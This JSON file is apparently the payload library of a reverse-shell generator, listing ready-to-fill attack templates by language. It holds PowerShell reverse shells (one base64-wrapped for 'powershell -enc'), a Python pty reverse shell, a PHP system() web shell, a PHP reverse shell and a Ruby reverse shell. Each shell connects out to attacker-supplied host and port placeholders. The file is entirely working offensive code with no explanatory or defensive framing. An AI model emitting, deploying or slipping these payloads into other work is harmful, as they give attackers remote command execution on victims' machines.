{
  "categories": [
    {
      "name": "Powershell",
      "payloads": [
        {
          "name": "Reverse Shell",
          "template": "$client = New-Object System.Net.Sockets.TCPClient(\"{{LHOST}}\",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        },
        {
          "name": "Reverse Shell (base64 encoded)",
          "template": "$client = New-Object System.Net.Sockets.TCPClient(\"{{LHOST}}\",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
          "encode": "powershell_utf16le",
          "wrap": "powershell -enc {{PAYLOAD}}"
        }
      ]
    },
    {
      "name": "Python",
      "payloads": [
        {
          "name": "Reverse Shell",
          "template": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        }
      ]
    },
    {
      "name": "PHP",
      "payloads": [
        {
          "name": "One-liner Web Shell",
          "template": "<?php system($_GET['cmd']); ?>"
        },
        {
          "name": "One-linerReverse Shell",
          "template": "php -r \"$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/bash -i <&3 >&3 2>&3\");\""
        },
        {
          "name": "Reverse Shell (File)",
          "path": "asdf"
        }
      ]
    },
    {
      "name": "Ruby",
      "payloads": [
        {
          "name": "Reverse Shell",
          "template": "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
        }
      ]
    }
  ]
}
